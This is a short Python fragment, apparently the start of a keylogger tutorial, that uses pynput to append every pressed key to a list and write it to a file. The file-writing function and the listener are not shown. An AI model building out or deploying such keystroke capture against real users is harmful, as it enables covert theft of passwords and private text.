#Import required modules
from pynput.keyboard import Key
#Create an empty list to store pressed keys
keys = []
#Create a function that defines what to do on each key press
def on_each_key_press(key):
    #Append each pressed key to a list
    keys.append(key)
    #Write list to file after each key pressed
    write_keys_to_file(keys)
